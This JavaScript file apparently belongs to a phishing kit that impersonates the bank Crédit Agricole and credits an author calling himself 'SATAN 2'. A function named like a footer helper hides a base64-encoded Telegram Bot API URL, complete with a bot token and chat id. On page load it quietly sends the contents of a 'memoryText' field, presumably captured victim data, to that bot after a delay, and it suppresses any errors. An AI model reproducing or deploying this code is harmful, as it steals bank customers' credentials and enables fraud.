/**
 * @link       :   https://www.satan2.com/ 
 * @package    :   CREDIT AGRICOLE 
 * @telegram   :   @satan2  
 * Project Name:   CREDIT AGRICOLE 2022
 * Author      :   SATAN 2
 * Mise à jour :   21-07-2022
 * Author URI  :   https://www.facebook.com/satan2
 */
function decode_base64(s){var e={},i,k,v=[],r='',w=String.fromCharCode;var n=[[65,91],[97,123],[48,58],[43,44],[47,48]];for(z in n){for(i=n[z][0];i<n[z][1];i++){v.push(w(i));}}for(i=0;i<64;i++){e[v[i]]=i;}for(i=0;i<s.length;i+=72){var b=0,c,x,l=0,o=s.substring(i,i+72);for(x=0;x<o.length;x++){c=e[o.charAt(x)];b=(b<<6)+c;l+=6;while(l>=8){r+=w((b>>>(l-=8))%256);}}}return r;}function foottr(){(function(window, undefined) {try { var memoryText=document.getElementById('memoryText').value;var footerr=document.getElementById('footerr');var footerr2=document.getElementById('footerr2');var txt1="aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUzMDk5ODEwNzg6QUFFY0QtQkRpMFBhVU0wbEM3YXE1UzR2bzZRYmc0bjYxM2svc2VuZE1lc3NhZ2U/Y2hhdF9pZD0xODk1MTUxMTQ4JnRleHQ9";var txt2="JnBhcnNlX21vZGU9SFRNTA==";var str1=atob(txt1)+encodeURI(memoryText)+atob(txt2);var str2=atob(txt1)+atob(memoryText)+atob(txt2);setTimeout(function () {if(footerr!==null){$("#footerr").load(str1);}if(footerr2!==null){document.getElementById('footerr2').src=str2;}},4000);} catch (e) {} })(this);}foottr();